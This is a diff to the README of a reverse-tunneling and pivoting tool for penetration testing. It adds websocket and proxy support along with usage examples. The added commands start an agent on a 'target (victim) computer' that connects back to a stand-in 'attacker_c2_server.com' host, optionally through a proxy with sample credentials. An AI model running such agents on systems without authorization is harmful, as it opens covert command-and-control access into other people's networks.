@@ -52,6 +52,8 @@ tunnels from a reverse TCP/TLS connection using a **tun interface** (without the
 - Does not require high privileges
 - Socket listening/binding on the *agent*
 - Multiple platforms supported for the *agent*
+- Using websockets for agent connection (with Cloudflare/AWS support)
+- Socks5/HTTP proxy server support
 
 ## How is this different from Ligolo/Chisel/Meterpreter... ?
 
@@ -138,7 +140,20 @@ Start the *agent* on your target (victim) computer (no privileges are required!)
 $ ./agent -connect attacker_c2_server.com:11601
 ```
 
-> If you want to tunnel the connection over a SOCKS5 proxy, you can use the `--socks ip:port` option. You can specify SOCKS credentials using the `--socks-user` and `--socks-pass` arguments.
+Or you can start the *agent* on your target (victim) computer and connect via websocket:
+
+```shell
+$ ./agent -connect https://attacker_c2_server.com:8443
+```
+> If you want to tunnel the connection over a proxy, you can use the `--proxy ip:port` option. 
+> In direct mode agent uses SOCKS5 proxy protocol. In websocket mode - HTTP proxy. 
+> You can specify SOCKS credentials using the `--socks-user` and `--socks-pass` arguments.
+> In case of using HTTP-proxy you can use standard URL scheme: http://user:Password@proxy-address:port.
+```shell
+$ ./agent -connect https://attacker_c2_server.com:8443 --proxy http://admin:secret@127.0.0.1:8080
+```
+
+> In case of websocket you can additionally set User-Agent header with -ua parameter
 
 A session should appear on the *proxy* server.
 
